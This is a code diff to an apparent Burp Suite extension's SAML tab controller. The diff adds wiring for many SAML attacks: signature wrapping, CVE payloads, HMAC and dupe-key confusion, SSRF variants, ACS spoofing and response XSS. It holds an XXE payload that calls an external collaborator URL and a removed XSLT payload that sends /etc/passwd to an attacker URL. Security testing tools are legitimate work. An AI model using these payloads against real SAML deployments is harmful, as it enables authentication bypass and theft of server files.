@@ -15,11 +15,25 @@ import gui.SamlPanelInfo;
 import gui.SamlXmlEditor;
 import gui.SignatureHelpWindow;
 import gui.XSWHelpWindow;
+import helpers.AssertionManipulator;
+import helpers.CommentInjection;
 import helpers.CVE_2022_41912;
+import helpers.CVE_2024_45409;
 import helpers.CVE_2025_23369;
 import helpers.CVE_2025_25291;
 import helpers.CVE_2025_25292;
+import helpers.ACSSpoof;
+import helpers.DigestTamper;
+import helpers.DupeKeyConfusion;
+import helpers.EncryptionSSRF;
+import helpers.HMACConfusion;
+import helpers.IssuerConfusion;
+import helpers.KeyInfoSSRF;
+import helpers.PIInjection;
+import helpers.ResponseXSS;
+import helpers.SignatureRefSSRF;
 import helpers.XMLHelpers;
+import helpers.XSLTPayloads;
 import helpers.XSWHelpers;
 import java.awt.Component;
 import java.awt.Desktop;
@@ -79,12 +93,22 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
     private XSWHelpers xswHelpers;
     private boolean isEdited = false;
 
+    // Signature staleness tracking
+    private boolean hadSignature = false;   // original message contained a <Signature> element
+    private boolean signatureIsStale = false;
+    // Remembered original X509Certificate from the *pre-attack* KeyInfo.
+    // Captured at setRequestResponse time so Dupe-Key Confusion can restore
+    // the victim identity after the user re-signs with an attacker key.
+    private String originalX509Cert = null;
+
     public SamlTabController(boolean editable, CertificateTabController certificateTabController) {
         this.certificateTabController = requireNonNull(certificateTabController, "certificateTabController");
         this.editable = editable;
         samlGUI = new SamlMain(this);
         textArea = samlGUI.getXmlEditorAction();
         textArea.setEditable(editable);
+        // Manual edits in the editor mark the signature stale (same as applying an attack).
+        textArea.setOnUserEditCallback(this::markSignatureStale);
         xmlHelpers = new XMLHelpers();
         xswHelpers = new XSWHelpers();
         this.certificateTabController.addObserver(this);
@@ -232,10 +256,12 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
                                     ? HttpParameterType.URL
                                     : HttpParameterType.BODY;
 
-                    var parameterValue =
+                    var paramName =
                             this.samlMessageAnalysisResult.isSAMLRequest()
-                                    ? requestResponse.request().parameterValue(certificateTabController.getSamlRequestParameterName(), httpParamType)
-                                    : requestResponse.request().parameterValue(certificateTabController.getSamlResponseParameterName(), httpParamType);
+                                    ? certificateTabController.getSamlRequestParameterName()
+                                    : certificateTabController.getSamlResponseParameterName();
+                    var parameterValue = SamlMessageAnalyzer.extractParameterValue(
+                            requestResponse.request(), paramName, httpParamType);
 
                     var decodedSAMLMessage =
                             SamlMessageDecoder.getDecodedSAMLMessage(
@@ -261,6 +287,20 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
             updateXSWList();
             orgSAMLMessage = samlMessage;
 
+            // Detect whether the loaded message has a signature so staleness can be tracked.
+            // Also remember the original X509Certificate for Dupe Key Confusion.
+            hadSignature = false;
+            originalX509Cert = null;
+            try {
+                Document sigDoc = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);
+                hadSignature = sigDoc.getElementsByTagNameNS("*", "Signature").getLength() > 0;
+                if (hadSignature) {
+                    originalX509Cert = xmlHelpers.getCertificate(sigDoc.getDocumentElement());
+                }
+            } catch (Exception ignored) {}
+            signatureIsStale = false;
+            samlGUI.getActionPanel().setSignatureStatus(false);
+
             // Show prettified XML (editable) for sanity when working with big SAML blobs.
             textArea.setText(prettifyXmlOrFallback(samlMessage));
             textArea.setEditable(editable);
@@ -284,10 +324,17 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
 
         try {
             Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);
+
+            infoPanel.setIssuer(xmlHelpers.getIssuer(document));
+            infoPanel.setResponseDestination(xmlHelpers.getResponseAttribute(document, "Destination"));
+            infoPanel.setResponseIssueInstant(xmlHelpers.getResponseAttribute(document, "IssueInstant"));
+            infoPanel.setResponseInResponseTo(xmlHelpers.getResponseAttribute(document, "InResponseTo"));
+            infoPanel.setResponseStatus(xmlHelpers.getStatusCode(document));
+
             NodeList assertions = xmlHelpers.getAssertions(document);
             if (assertions.getLength() > 0) {
                 Node assertion = assertions.item(0);
-                infoPanel.setIssuer(xmlHelpers.getIssuer(document));
+                infoPanel.setSubject(xmlHelpers.getSubjectNameID(assertion));
                 infoPanel.setConditionNotBefore(xmlHelpers.getConditionNotBefore(assertion));
                 infoPanel.setConditionNotAfter(xmlHelpers.getConditionNotAfter(assertion));
                 infoPanel.setSubjectConfNotBefore(xmlHelpers.getSubjectConfNotBefore(assertion));
@@ -295,9 +342,13 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
                 infoPanel.setSignatureAlgorithm(xmlHelpers.getSignatureAlgorithm(assertion));
                 infoPanel.setDigestAlgorithm(xmlHelpers.getDigestAlgorithm(assertion));
             } else {
-                assertions = xmlHelpers.getEncryptedAssertions(document);
-                Node assertion = assertions.item(0);
-                infoPanel.setEncryptionAlgorithm(xmlHelpers.getEncryptionMethod(assertion));
+                NodeList encrypted = xmlHelpers.getEncryptedAssertions(document);
+                if (encrypted.getLength() > 0) {
+                    Node enc = encrypted.item(0);
+                    infoPanel.setEncryptionAlgorithm(xmlHelpers.getEncryptionMethod(enc));
+                    infoPanel.setKeyTransport(xmlHelpers.getKeyTransportAlgorithm(enc));
+                    infoPanel.setKeyIdentifier(xmlHelpers.getEncryptionKeyIdentifier(enc));
+                }
             }
         } catch (SAXException e) {
             setInfoMessageText(XML_NOT_WELL_FORMED);
@@ -305,15 +356,7 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
     }
 
     private void resetInformationDisplay() {
-        SamlPanelInfo infoPanel = samlGUI.getInfoPanel();
-        infoPanel.setIssuer("");
-        infoPanel.setConditionNotBefore("");
-        infoPanel.setConditionNotAfter("");
-        infoPanel.setSubjectConfNotBefore("");
-        infoPanel.setSubjectConfNotAfter("");
-        infoPanel.setSignatureAlgorithm("");
-        infoPanel.setDigestAlgorithm("");
-        infoPanel.setEncryptionAlgorithm("");
+        samlGUI.getInfoPanel().clearAll();
     }
 
 
@@ -326,6 +369,7 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
                 textArea.setText(prettifyXmlOrFallback(samlMessage));
                 isEdited = true;
                 setInfoMessageText("Message signature successful removed");
+                clearSignatureStaleness();
             } else {
                 setInfoMessageText("No Signatures available to remove");
             }
@@ -354,6 +398,7 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
         textArea.resetModified();
         samlGUI.getStatusPanel().setText("");
         isEdited = false;
+        clearSignatureStaleness();
     }
 
     public void resignAssertion() {
@@ -376,6 +421,7 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
                 textArea.setText(prettifyXmlOrFallback(samlMessage));
                 isEdited = true;
                 setInfoMessageText("Assertions successfully signed");
+                clearSignatureStaleness();
             } else {
                 setInfoMessageText("no certificate chosen to sign");
             }
@@ -411,6 +457,7 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
                     textArea.setText(prettifyXmlOrFallback(samlMessage));
                     isEdited = true;
                     setInfoMessageText("Message successfully signed");
+                    clearSignatureStaleness();
                 } else {
                     setInfoMessageText("no certificate chosen to sign");
                 }
@@ -476,10 +523,11 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
 
     public void showXSWPreview() {
         try {
-            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(orgSAMLMessage);
+            String current = textArea.getText();
+            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(current);
             xswHelpers.applyXSW(samlGUI.getActionPanel().getSelectedXSW(), document);
             String after = xmlHelpers.getStringOfDocument(document);
-            String diff = xswHelpers.diffLineMode(orgSAMLMessage, after);
+            String diff = xswHelpers.diffLineMode(current, after);
 
             File file = File.createTempFile("tmp", ".html", null);
             FileOutputStream fileOutputStream = new FileOutputStream(file);
@@ -514,30 +562,42 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
     public void applyCVE() {
         try {
             var cve = samlGUI.getActionPanel().getSelectedCVE();
+            String current = textArea.getText();
             switch (cve) {
                 case CVE_2022_41912.CVE:
-                    samlMessage = CVE_2022_41912.apply(orgSAMLMessage);
+                    samlMessage = CVE_2022_41912.apply(current);
                     textArea.setText(prettifyXmlOrFallback(samlMessage));
                     isEdited = true;
                     setInfoMessageText("%s applied".formatted(cve));
+                    markSignatureStale();
                     break;
                 case CVE_2025_23369.CVE:
-                    samlMessage = CVE_2025_23369.apply(orgSAMLMessage);
+                    samlMessage = CVE_2025_23369.apply(current);
                     textArea.setText(prettifyXmlOrFallback(samlMessage));
                     isEdited = true;
                     setInfoMessageText("%s applied".formatted(cve));
+                    markSignatureStale();
                     break;
                 case CVE_2025_25291.CVE:
-                    samlMessage = CVE_2025_25291.apply(orgSAMLMessage);
+                    samlMessage = CVE_2025_25291.apply(current);
                     textArea.setText(prettifyXmlOrFallback(samlMessage));
                     isEdited = true;
                     setInfoMessageText("%s applied".formatted(cve));
+                    markSignatureStale();
                     break;
                 case CVE_2025_25292.CVE:
-                    samlMessage = CVE_2025_25292.apply(orgSAMLMessage);
+                    samlMessage = CVE_2025_25292.apply(current);
                     textArea.setText(prettifyXmlOrFallback(samlMessage));
                     isEdited = true;
                     setInfoMessageText("%s applied".formatted(cve));
+                    markSignatureStale();
+                    break;
+                case CVE_2024_45409.CVE:
+                    samlMessage = CVE_2024_45409.apply(current);
+                    textArea.setText(prettifyXmlOrFallback(samlMessage));
+                    isEdited = true;
+                    setInfoMessageText("%s applied".formatted(cve));
+                    markSignatureStale();
                     break;
             }
         } catch (Exception exc) {
@@ -546,15 +606,247 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
         }
     }
 
+    public void applyCommentInjection(CommentInjection.Position position) {
+        try {
+            // Comment injection inserts nodes that exclusive C14N strips before digest
+            // computation, so the existing signature remains valid — do not mark stale.
+            samlMessage = CommentInjection.apply(textArea.getText(), position);
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("Comment injected (" + position.name() + ") — signature remains valid via C14N");
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    public void applyHMACConfusion() {
+        try {
+            samlMessage = HMACConfusion.apply(textArea.getText());
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("HMAC confusion applied — SignatureMethod swapped to HMAC-SHA256");
+            markSignatureStale();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    public void applyExtendValidity(int hours) {
+        try {
+            samlMessage = AssertionManipulator.extendValidity(textArea.getText(), hours);
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("Validity extended by " + hours + "h — re-sign if the assertion is signed");
+            markSignatureStale();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    public void applyStatusSuccess() {
+        try {
+            samlMessage = AssertionManipulator.forceStatusSuccess(textArea.getText());
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("StatusCode set to Success");
+            markSignatureStale();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    public void applyRemoveAudience() {
+        try {
+            samlMessage = AssertionManipulator.removeAudienceRestriction(textArea.getText());
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("AudienceRestriction removed");
+            markSignatureStale();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    public void applyDigestTamper() {
+        try {
+            samlMessage = DigestTamper.apply(textArea.getText());
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("DigestValue corrupted — forward to test SP signature verification");
+            markSignatureStale();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    public void applyKeyInfoSSRF(String retrievalUrl) {
+        try {
+            samlMessage = KeyInfoSSRF.apply(textArea.getText(), retrievalUrl);
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("KeyInfo replaced with RetrievalMethod → " + retrievalUrl);
+            markSignatureStale();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    public void applyEncryptionSSRF(EncryptionSSRF.Mode mode, String url) {
+        try {
+            samlMessage = EncryptionSSRF.apply(textArea.getText(), mode, url);
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText(mode.name() + " → " + url);
+            // Outer Response signature covers the EncryptedAssertion subtree; mutating
+            // its internals invalidates any enclosing signature.
+            markSignatureStale();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    public void applySignatureRefSSRF(SignatureRefSSRF.Mode mode, String url) {
+        try {
+            samlMessage = SignatureRefSSRF.apply(textArea.getText(), mode, url);
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText(mode.name() + " → " + url);
+            markSignatureStale();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    public void applyPIInjection(PIInjection.Position position) {
+        try {
+            // Processing instructions may or may not be stripped by c14n depending on
+            // algorithm — mark stale to be safe.
+            samlMessage = PIInjection.apply(textArea.getText(), position);
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("Processing instruction injected (" + position.name() + ")");
+            markSignatureStale();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    public void applyIssuerConfusion(IssuerConfusion.Mode mode) {
+        try {
+            samlMessage = IssuerConfusion.apply(textArea.getText(), mode);
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("Issuer mutated (" + mode.name() + ")");
+            markSignatureStale();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    public void applyACSSpoof(String attackerUrl) {
+        try {
+            samlMessage = ACSSpoof.apply(textArea.getText(), attackerUrl);
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("AssertionConsumerServiceURL → " + attackerUrl);
+            markSignatureStale();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    public void applyDupeKeyConfusion() {
+        try {
+            BurpCertificate attackerCert = samlGUI.getActionPanel().getSelectedCertificate();
+            if (attackerCert == null) {
+                setInfoMessageText("Pick an attacker cert (with private key) in the Signing dropdown first.");
+                return;
+            }
+            if (originalX509Cert == null || originalX509Cert.isBlank()) {
+                setInfoMessageText("Could not find the original X509Certificate — was the loaded message signed?");
+                return;
+            }
+            // Step 1: re-sign the assertion with the attacker key so the signature verifies under it.
+            resignAssertion();
+            // Step 2: rewrite KeyInfo — attacker RSAKeyValue first, original X509 second.
+            samlMessage = DupeKeyConfusion.apply(textArea.getText(), attackerCert, originalX509Cert);
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("Dupe Key Confusion applied — forward as-is");
+            // Not stale — signature verifies under attacker key per design.
+            clearSignatureStaleness();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    public void importMetadata(String metadataXml) {
+        try {
+            var entries = helpers.MetadataImport.extract(metadataXml);
+            if (entries.isEmpty()) {
+                setInfoMessageText("Metadata contained no <ds:X509Certificate> entries.");
+                return;
+            }
+            int imported = 0;
+            for (var entry : entries) {
+                // Build PEM-wrapped string so the existing importer parses it as a certificate.
+                String pem = "-----BEGIN CERTIFICATE-----\n"
+                        + wrap64(entry.base64Der())
+                        + "-----END CERTIFICATE-----\n";
+                var cert = certificateTabController.importCertificateFromString(pem);
+                if (cert != null) imported++;
+            }
+            setInfoMessageText("Imported " + imported + " certificate(s) from metadata");
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
+    private static String wrap64(String b64) {
+        StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < b64.length(); i += 64) {
+            sb.append(b64, i, Math.min(i + 64, b64.length())).append('\n');
+        }
+        return sb.toString();
+    }
+
+    public void applyResponseXSS(ResponseXSS.Target target, String payload) {
+        try {
+            samlMessage = ResponseXSS.apply(textArea.getText(), target, payload);
+            textArea.setText(prettifyXmlOrFallback(samlMessage));
+            isEdited = true;
+            setInfoMessageText("XSS payload injected into " + target.name());
+            markSignatureStale();
+        } catch (Exception e) {
+            setInfoMessageText(e.getMessage());
+            BurpExtender.api.logging().logToError(e);
+        }
+    }
+
     public void applyXSW() {
         Document document;
         try {
-            document = xmlHelpers.getXMLDocumentOfSAMLMessage(orgSAMLMessage);
+            document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getText());
             xswHelpers.applyXSW(samlGUI.getActionPanel().getSelectedXSW(), document);
             samlMessage = xmlHelpers.getStringOfDocument(document);
             textArea.setText(prettifyXmlOrFallback(samlMessage));
             isEdited = true;
             setInfoMessageText(XSW_ATTACK_APPLIED);
+            markSignatureStale();
         } catch (SAXException e) {
             setInfoMessageText(XML_NOT_WELL_FORMED);
         } catch (IOException e) {
@@ -565,58 +857,50 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
     }
 
     public void applyXXE(String collabUrl) {
+        String current = textArea.getText();
         String xxePayload = "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"" + collabUrl + "\"> %xxe; ]>\n";
-        String[] splitMsg = orgSAMLMessage.split("\\?>");
+        String[] splitMsg = current.split("\\?>");
         if (splitMsg.length == 2) {
             samlMessage = splitMsg[0] + "?>" + xxePayload + splitMsg[1];
         } else {
             String xmlDeclaration = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
-            samlMessage = xmlDeclaration + xxePayload + orgSAMLMessage;
+            samlMessage = xmlDeclaration + xxePayload + current;
         }
         textArea.setText(prettifyXmlOrFallback(samlMessage));
         isEdited = true;
         setInfoMessageText(XXE_CONTENT_APPLIED);
+        markSignatureStale();
     }
 
-    public void applyXSLT(String collabUrl) {
+    public void applyXSLT(XSLTPayloads.Flavor flavor, String param) {
+        String current = textArea.getText();
         var prefixed = true;
         var transformString = "<ds:Transforms>";
 
-        int index = orgSAMLMessage.indexOf(transformString);
+        int index = current.indexOf(transformString);
         if (index == -1) {
             prefixed = false;
             transformString = "<Transforms>";
         }
 
-        index = orgSAMLMessage.indexOf(transformString);
+        index = current.indexOf(transformString);
         if (index == -1) {
             setInfoMessageText(XML_NOT_SUITABLE_FOR_XSLT);
             return;
         }
 
         var prefix = prefixed ? "ds:" : "";
-        var xslt = """
-                
-                <%sTransform>
-                  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-                    <xsl:template match="doc">
-                      <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
-                      <xsl:variable name="escaped" select="encode-for-uri($file)"/>
-                      <xsl:variable name="attackerUrl" select="'%s'"/>
-                      <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
-                      <xsl:value-of select="unparsed-text($exploitUrl)"/>
-                    </xsl:template>
-                  </xsl:stylesheet>
-                </%sTransform>
-                """.formatted(prefix, collabUrl, prefix);
+        var stylesheet = XSLTPayloads.stylesheetFor(flavor, param);
+        var xslt = "\n<%sTransform>\n%s\n</%sTransform>\n".formatted(prefix, stylesheet, prefix);
 
         int substringIndex = index + transformString.length();
-        String firstPart = orgSAMLMessage.substring(0, substringIndex);
-        String secondPart = orgSAMLMessage.substring(substringIndex);
+        String firstPart = current.substring(0, substringIndex);
+        String secondPart = current.substring(substringIndex);
         samlMessage = firstPart + xslt + secondPart;
         textArea.setText(prettifyXmlOrFallback(samlMessage));
         isEdited = true;
-        setInfoMessageText(XSLT_CONTENT_APPLIED);
+        setInfoMessageText(XSLT_CONTENT_APPLIED + " (" + flavor.name() + ")");
+        markSignatureStale();
     }
 
     public synchronized void addMatchAndReplace(String match, String replace) {
@@ -666,5 +950,22 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
     public void setEditorContents(String text) {
         this.isEdited = true;
         this.textArea.setText(prettifyXmlOrFallback(text));
+    }
+
+    // Called after any attack or manual edit that leaves the document content
+    // out of sync with its embedded signature(s).
+    private void markSignatureStale() {
+        if (hadSignature && !signatureIsStale) {
+            signatureIsStale = true;
+            samlGUI.getActionPanel().setSignatureStatus(true);
+        }
+    }
+
+    // Called after re-sign, reset, or signature removal — signature is no longer stale.
+    private void clearSignatureStaleness() {
+        if (signatureIsStale) {
+            signatureIsStale = false;
+            samlGUI.getActionPanel().setSignatureStatus(false);
+        }
     }
 }
